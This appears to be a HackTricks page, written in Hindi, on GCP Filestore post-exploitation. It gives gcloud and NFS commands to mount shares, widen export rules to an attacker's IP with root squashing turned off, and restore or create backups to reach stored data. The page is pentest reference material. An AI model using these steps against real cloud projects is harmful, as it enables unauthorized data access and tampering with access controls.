# GCP - Filestore पोस्ट-एक्सप्लॉइटेशन

{{#include ../../../banners/hacktricks-training.md}}

## Filestore

Filestore के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Filestore माउंट करें

एक साझा फ़ाइलसिस्टम **संवेदनशील जानकारी हो सकती है** जो एक हमलावर के दृष्टिकोण से रुचिकर हो सकती है। Filestore तक पहुँच होने पर इसे **माउंट करना** संभव है:

<details>

<summary>Filestore फ़ाइलसिस्टम को माउंट करें</summary>
```bash
sudo apt-get update
sudo apt-get install nfs-common
# Check the share name
showmount -e <IP>
# Mount the share
mkdir /mnt/fs
sudo mount [FILESTORE_IP]:/[FILE_SHARE_NAME] /mnt/fs
```
</details>

filestore instance के IP address को खोजने के लिए पेज के enumeration सेक्शन को देखें:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### प्रतिबंध हटाएँ और अतिरिक्त permissions प्राप्त करें

यदि attacker उस IP address पर नहीं है जिसे share पर access है, लेकिन आपके पास उसे modify करने के लिए पर्याप्त permissions हैं, तो प्रतिबंधों को हटाना या उस पर access बदलना संभव है। आप अपने IP address को अधिक privileges दे कर share पर admin access प्राप्त कर सकते हैं:

<details>

<summary>Filestore instance को access की अनुमति देने के लिए अपडेट करें</summary>
```bash
gcloud filestore instances update nfstest \
--zone=<exact-zone> \
--flags-file=nfs.json

# Contents of nfs.json
{
"--file-share":
{
"capacity": "1024",
"name": "<share-name>",
"nfs-export-options": [
{
"access-mode": "READ_WRITE",
"ip-ranges": [
"<your-ip-private-address>/32"
],
"squash-mode": "NO_ROOT_SQUASH",
"anon_uid": 1003,
"anon_gid": 1003
}
]
}
}
```
</details>

### बैकअप पुनर्स्थापित करें

यदि कोई backup मौजूद है तो इसे किसी मौजूदा या नए instance में **पुनर्स्थापित किया जा सकता है** ताकि इसकी **जानकारी उपलब्ध हो जाए:**

<details>

<summary>नया instance बनाएं और backup पुनर्स्थापित करें</summary>
```bash
# Create a new filestore if you don't want to modify the old one
gcloud filestore instances create <new-instance-name> \
--zone=<zone> \
--tier=STANDARD \
--file-share=name=vol1,capacity=1TB \
--network=name=default,reserved-ip-range=10.0.0.0/29

# Restore a backups in a new instance
gcloud filestore instances restore <new-instance-name> \
--zone=<zone> \
--file-share=<instance-file-share-name> \
--source-backup=<backup-name> \
--source-backup-region=<backup-region>

# Follow the previous section commands to mount it
```
</details>

### एक backup बनाकर उसे restore करें

यदि आप **किसी share पर पहुँच नहीं रखते और उसे संशोधित नहीं करना चाहते हैं**, तो इसकी **backup** बना कर और पहले बताए अनुसार इसे **restore** करना संभव है:

<details>

<summary>नई instance में backup बनाकर उसे restore करें</summary>
```bash
# Create share backup
gcloud filestore backups create <back-name> \
--region=<region> \
--instance=<instance-name> \
--instance-zone=<instance-zone> \
--file-share=<share-name>

# Follow the previous section commands to restore it and mount it
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
